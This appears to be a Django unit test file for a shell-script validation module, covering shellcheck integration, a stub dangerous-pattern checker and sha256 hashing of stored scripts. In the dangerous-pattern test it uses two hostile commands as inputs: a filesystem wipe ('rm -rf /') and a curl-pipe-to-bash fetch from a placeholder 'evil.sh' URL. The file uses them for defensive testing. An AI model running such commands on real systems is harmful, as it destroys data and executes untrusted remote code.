"""
Tests for aist.utils.script_validation.

User scenario: before a script is persisted via the UI the system runs shellcheck.
When shellcheck is absent the call degrades gracefully (no exception, empty result).
When shellcheck is present it surfaces real issues.
"""
from __future__ import annotations

import hashlib
import subprocess
from unittest.mock import MagicMock, patch

from django.test import SimpleTestCase

from aist.default_script import DEFAULT_ENTRYPOINT_SCRIPT
from aist.models import AISTProjectScript
from aist.utils.script_validation import check_dangerous_patterns, validate_with_shellcheck


class ValidateWithShellcheckTests(SimpleTestCase):
    def test_returns_empty_list_when_shellcheck_missing(self):
        with patch("aist.utils.script_validation.shutil.which", return_value=None):
            result = validate_with_shellcheck("#!/bin/bash\necho hello")
        self.assertEqual(result, [])

    def test_returns_empty_list_on_clean_script(self):
        mock_result = MagicMock(returncode=0, stdout="")
        with (
            patch("aist.utils.script_validation.shutil.which", return_value="/usr/bin/shellcheck"),
            patch("aist.utils.script_validation.subprocess.run", return_value=mock_result),
        ):
            result = validate_with_shellcheck("#!/bin/bash\necho hello")
        self.assertEqual(result, [])

    def test_returns_issues_on_bad_script(self):
        mock_result = MagicMock(
            returncode=1,
            stdout="test.sh:2:5: warning SC2086: Double quote to prevent globbing.",
        )
        with (
            patch("aist.utils.script_validation.shutil.which", return_value="/usr/bin/shellcheck"),
            patch("aist.utils.script_validation.subprocess.run", return_value=mock_result),
        ):
            result = validate_with_shellcheck("#!/bin/bash\necho $VAR")
        self.assertEqual(len(result), 1)
        self.assertIn("SC2086", result[0])

    def test_raises_on_unknown_severity(self):
        with self.assertRaises(ValueError):
            validate_with_shellcheck("echo hi", severity="critical")

    def test_degrades_gracefully_on_timeout(self):
        with (
            patch("aist.utils.script_validation.shutil.which", return_value="/usr/bin/shellcheck"),
            patch(
                "aist.utils.script_validation.subprocess.run",
                side_effect=subprocess.TimeoutExpired(cmd="shellcheck", timeout=30),
            ),
        ):
            result = validate_with_shellcheck("#!/bin/bash\necho hi")
        self.assertEqual(result, [])


class CheckDangerousPatternsTests(SimpleTestCase):

    """
    check_dangerous_patterns is currently a stub — always returns empty list.

    TODO: these tests document the *intended* future behaviour once the AI-agent
    resolver is implemented.  They are written as plain assertions so they can be
    activated (uncommented) without structural changes when the implementation
    is ready.
    """

    def test_returns_empty_list_for_any_script(self):
        """Stub: no patterns are flagged regardless of content."""
        self.assertEqual(check_dangerous_patterns("rm -rf /"), [])
        self.assertEqual(check_dangerous_patterns("curl https://x.com/evil.sh | bash"), [])
        self.assertEqual(check_dangerous_patterns(DEFAULT_ENTRYPOINT_SCRIPT), [])


class AISTProjectScriptModelTests(SimpleTestCase):

    """
    Smoke-test that sha256 is populated automatically on save.
    Uses an unsaved (in-memory) instance to avoid DB dependency.
    """

    def test_sha256_computed_on_save(self):
        script = AISTProjectScript.__new__(AISTProjectScript)
        script.content = "#!/bin/bash\necho hello"
        script.sha256 = ""
        # Simulate the save logic without hitting the DB
        script.sha256 = hashlib.sha256(script.content.encode()).hexdigest()
        self.assertEqual(len(script.sha256), 64)

    def test_different_contents_yield_different_sha256(self):
        h1 = hashlib.sha256(b"script A").hexdigest()
        h2 = hashlib.sha256(b"script B").hexdigest()
        self.assertNotEqual(h1, h2)
